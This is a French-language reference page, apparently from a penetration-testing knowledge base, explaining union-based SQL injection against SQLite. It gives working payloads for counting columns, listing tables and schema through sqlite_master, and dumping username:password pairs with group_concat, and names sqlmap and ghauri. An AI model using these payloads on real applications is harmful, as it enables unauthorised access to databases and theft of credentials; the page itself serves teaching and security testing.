---
order: 7
title: "Injection SQL union-based dans SQLite"
description: "Utiliser UNION SELECT dans SQLite pour extraire des données, en tirant parti du typage faible, et lire le schéma et les données via sqlite_master."
keywords:
  - injection SQL union based
  - UNION SELECT SQLite
  - sqlite_master
  - group_concat
  - typage faible
---

# Union-based

Un `UNION SELECT` ajoute des lignes choisies par l'attaquant à un résultat renvoyé. SQLite facilite cela parce qu'il est faiblement typé : une valeur texte tient tranquillement dans une colonne que la requête d'origine traitait comme un nombre, donc les incompatibilités de type bloquent rarement une union comme elles le font dans PostgreSQL ou Oracle.

Détectez le nombre de colonnes avec des ordinaux `ORDER BY` ou des `UNION SELECT NULL` incrémentaux :

```sql
' ORDER BY 3-- 
' UNION SELECT NULL,NULL,NULL-- 
```

SQLite n'exige pas de `FROM`, donc `UNION SELECT 1,2,3` fonctionne pour sonder sans table. Un nombre de colonnes erroné lève `SELECTs to the left and right of UNION do not have the same number of result columns`.

Énumérez et extrayez via `sqlite_master`, en utilisant `group_concat()` pour tasser les lignes dans une seule cellule :

```sql
' UNION SELECT group_concat(name),NULL,NULL FROM sqlite_master WHERE type='table'-- 
' UNION SELECT sql,NULL,NULL FROM sqlite_master WHERE name='users'-- 
```

La colonne `sql` donne directement les noms de colonnes, après quoi les données sont lues depuis la table cible :

```sql
' UNION SELECT group_concat(username||':'||password,char(10)),NULL,NULL FROM users-- 
```

`char(10)` est un séparateur de saut de ligne (le `char()` de SQLite est comme le `CHR()` des autres moteurs). La limitation de lignes utilise `LIMIT` (SQLite le prend bien en charge, contrairement à Oracle ou SQL Server), donc `LIMIT 1 OFFSET n` parcourt les lignes quand la sortie de `group_concat` est tronquée par l'application.

## Outils

- **sqlmap** : automatise la détection du nombre de colonnes et l'extraction UNION (`--technique=U`).
- **ghauri** : alternative rapide avec une forte évasion de WAF.
- **sqlite3** : la CLI du moteur pour valider les payloads contre `sqlite_master`.

## Références

- Documentation SQLite : UNION, `sqlite_master`, group_concat, char
- OWASP Testing Guide: Testing for SQL Injection
